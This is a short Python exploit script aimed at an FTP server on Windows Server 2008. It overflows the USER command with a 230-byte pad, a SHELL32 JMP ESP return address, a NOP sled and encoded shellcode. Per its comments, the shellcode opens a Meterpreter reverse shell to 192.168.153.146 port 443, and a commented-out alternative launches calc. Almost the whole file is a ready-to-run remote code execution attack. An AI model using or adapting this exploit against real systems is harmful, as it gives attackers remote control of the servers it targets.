#!/usr/bin/python

#freeeFtpServer xploitzzz  windows server 2008
#nom0w4xm0h4x
#zslf0liferr

import socket

#[*] Exact match at offset 230
#SHELL32.DLL JMP ESP 7621F7FD
#

ret = '\xFD\xF7\x21\x76'


sc = ("\xdb\xc6\xbb\x52\x8a\x28\xf4\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x56\x31\x5e\x18\x83\xc6\x04\x03\x5e\x46\x68\xdd\x08\x8e\xee"
"\x1e\xf1\x4e\x8f\x97\x14\x7f\x8f\xcc\x5d\x2f\x3f\x86\x30\xc3"
"\xb4\xca\xa0\x50\xb8\xc2\xc7\xd1\x77\x35\xe9\xe2\x24\x05\x68"
"\x60\x37\x5a\x4a\x59\xf8\xaf\x8b\x9e\xe5\x42\xd9\x77\x61\xf0"
"\xce\xfc\x3f\xc9\x65\x4e\xd1\x49\x99\x06\xd0\x78\x0c\x1d\x8b"
"\x5a\xae\xf2\xa7\xd2\xa8\x17\x8d\xad\x43\xe3\x79\x2c\x82\x3a"
"\x81\x83\xeb\xf3\x70\xdd\x2c\x33\x6b\xa8\x44\x40\x16\xab\x92"    #Windows MEterpreter shell 192.168.153.146 port 443
"\x3b\xcc\x3e\x01\x9b\x87\x99\xed\x1a\x4b\x7f\x65\x10\x20\x0b"    #Known Bad Chars '\x00\x0a\x0d
"\x21\x34\xb7\xd8\x59\x40\x3c\xdf\x8d\xc1\x06\xc4\x09\x8a\xdd"
"\x65\x0b\x76\xb3\x9a\x4b\xd9\x6c\x3f\x07\xf7\x79\x32\x4a\x9f"
"\x4e\x7f\x75\x5f\xd9\x08\x06\x6d\x46\xa3\x80\xdd\x0f\x6d\x56"
"\x54\x07\x8e\x88\xde\x48\x70\x29\x1e\x40\xb7\x7d\x4e\xfa\x1e"
"\xfe\x05\xfa\x9f\x2b\xb3\xf0\x37\x14\xeb\x9c\x5a\xfc\xe9\x9e"
"\x5b\x46\x64\x78\x0b\xe8\x26\xd5\xec\x58\x86\x85\x84\xb2\x09"
"\xf9\xb5\xbc\xc0\x92\x5c\x53\xbc\xcb\xc8\xca\xe5\x80\x69\x12"
"\x30\xed\xaa\x98\xb0\x11\x64\x69\xb1\x01\x91\x0e\x39\xda\x62"
"\xbb\x39\xb0\x66\x6d\x6e\x2c\x65\x48\x58\xf3\x96\xbf\xdb\xf4"
"\x69\x3e\xed\x8f\x5c\xd4\x51\xf8\xa0\x38\x51\xf8\xf6\x52\x51"
"\x90\xae\x06\x02\x85\xb0\x92\x37\x16\x25\x1d\x61\xca\xee\x75"
"\x8f\x35\xd8\xd9\x70\x10\x5a\x1d\x8e\xe6\x75\x86\xe6\x18\xc6"
"\x36\xf6\x72\xc6\x66\x9e\x89\xe9\x89\x6e\x71\x20\xc2\xe6\xf8"
"\xa5\xa0\x97\xfd\xef\x65\x09\xfd\x1c\xbe\xba\x84\x6d\x41\x3b"
"\x79\x64\x26\x3c\x79\x88\x58\x01\xaf\xb1\x2e\x44\x73\x86\x21"
"\xf3\xd6\xaf\xab\xfb\x45\xaf\xf9")

#sc = ("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
#"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
#"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
#"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"#Shellcode WinExec CALC
#"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"#Know badchars "\x00\xff\x0d\x0a\x3d\x20"
#"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
#"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
#"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
#"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
#"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
#"\x7f\xe8\x7b\xca")


nop = '\x90'*20
buffer = "A"*230 +ret +  nop + sc
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.153.160',33))
s.send("USER " +buffer+"\r\n")
s.recv(1024)
s.close
